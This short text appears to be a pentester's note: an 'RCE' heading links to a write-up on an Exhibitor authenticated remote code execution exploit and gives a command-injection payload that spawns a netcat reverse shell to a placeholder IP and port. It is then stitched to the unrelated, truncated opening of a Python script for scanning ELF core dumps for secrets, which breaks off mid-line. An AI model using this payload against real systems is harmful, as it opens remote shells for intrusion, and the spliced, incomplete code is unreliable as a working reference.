RCE
[CVE](https://medium.com/cyberquestor/exhibitor-v1-authenticated-remote-code-execution-rce-exploit-19f2d8603277)
```
$(/bin/nc -e /bin/sh <IP> <PORT>&)
```
#!/usr/bin/env python3
"""
Scan an ELF core dump for sensitive strings.
Usage:
    python3 core_secret_scanner.py /path/to/core [regex]
"""

import mmap, re, sys, struct, os

PHDR_SIZE  = 56          # size of Elf64_Phdr
ELFMAG

```
